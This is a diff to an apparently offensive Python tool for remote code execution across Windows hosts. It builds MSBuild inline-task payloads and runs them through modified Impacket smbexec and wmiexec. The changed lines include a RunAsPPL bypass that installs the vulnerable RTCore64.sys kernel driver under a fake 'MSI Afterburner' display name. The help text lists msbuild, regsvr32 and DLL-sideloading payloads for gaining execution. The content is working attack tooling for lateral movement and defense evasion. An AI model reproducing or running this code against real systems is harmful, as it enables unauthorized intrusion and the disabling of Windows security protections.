@@ -950,7 +950,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "                    }\n"
     xml_payload += "                }\n"
     if runasppl:
-        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type= kernel start= auto binPath= %s:\\\\RTCore64.sys DisplayName= \\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
         xml_payload += "                Thread.Sleep(1000);\n"
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
         xml_payload += "                Thread.Sleep(1000);\n"
@@ -979,6 +979,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
+
     if runasppl:
         os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
         os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))
@@ -1261,7 +1262,7 @@ def mt_execute(ip):  # multithreading requires a function
             atsvc_exec.play(ip)
         elif options.method == 'smbexec':
             executer = CMDEXEC(command, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
-                               'C$', 445, options.service_name, 'cmd')
+                               options.share, 445, options.service_name, 'cmd')
             executer.run(ip, ip)
         print("{} {}: Completed".format(green_plus, ip))
     except Exception as e:
@@ -1292,7 +1293,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="", epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
     if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
         parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
-    parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
+    parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$) (wmiexec and smbexec ONLY)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
@@ -1348,11 +1349,14 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts)
 
-    if options.runasppl and options.method == "wmiexec":
+    if "-share" not in sys.argv and options.method == "wmiexec": # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
+        options.share = "ADMIN$"
+
+    if options.runasppl and options.method != "smbexec": # check to see if they are trying to run runasppl bypass with something other than smbexec
         print("{}[!]{} RunAsPPL Bypass only works with the SMBExec method".format(color_RED, color_reset))
         sys.exit(0)
 
-    if options.runasppl and options.payload != "msbuild":
+    if options.runasppl and options.payload != "msbuild": # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
         print("{}[!]{} RunAsPPL Bypass only works with the MsBuild payload".format(color_RED, color_reset))
         sys.exit(0)
 
